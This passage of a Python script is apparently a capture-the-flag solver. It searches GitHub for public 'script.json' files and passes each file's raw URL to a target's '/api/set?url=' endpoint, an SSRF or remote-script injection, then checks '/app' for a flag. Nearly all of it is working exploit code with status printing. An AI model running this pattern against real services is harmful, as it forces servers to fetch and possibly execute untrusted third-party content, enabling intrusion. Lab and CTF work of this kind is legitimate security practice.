        print(f"[+] {url}: {r.status_code}")
        if r.status_code == 200:
            print(f"[+] Response type: {type(r.json())}")
            print(f"[+] First few items: {str(r.json()[:2])[:200] if isinstance(r.json(), list) else 'N/A'}")
    except Exception as e:
        print(f"[+] Error: {e}")

# Try searching for a file named script.json in public repos
print("\n[+] Searching GitHub for script.json files...")
search_query = "script.json in:path"
github_search = f"https://api.github.com/search/code?q={requests.utils.quote(search_query)}"
try:
    r = requests.get(github_search, timeout=10)
    print(f"[+] GitHub search status: {r.status_code}")
    if r.status_code == 200:
        data = r.json()
        items = data.get('items', [])
        print(f"[+] Found {len(items)} results")
        for item in items[:5]:  # Check first 5
            print(f"[+] {item.get('name')} in {item.get('repository', {}).get('full_name')}")
            # Get the raw URL
            raw_url = item.get('html_url', '').replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
            if raw_url:
                print(f"[+] Raw URL: {raw_url}")
                r2 = requests.get(raw_url, timeout=5)
                if r2.status_code == 200:
                    try:
                        json_data = r2.json()
                        if 'script' in json_data:
                            print(f"[!!] Found JSON with 'script' field!")
                            print(f"[+] Content: {json_data}")
                            
                            # Test with SSRF
                            set_url = f"{target}/api/set?url={requests.utils.quote(raw_url)}"
                            r3 = requests.get(set_url)
                            print(f"[+] Set: {r3.text}")
                            
                            r4 = requests.get(f"{target}/app")
                            print(f"[+] App: {r4.status_code}")
                            if "FLAG" in r4.text or "flag{" in r4.text.lower():
                                print(f"[!!!] FLAG FOUND!")
                                print(r4.text)
                    except:
                        pass
except Exception as e:
    print(f"[+] GitHub search error: {e}")

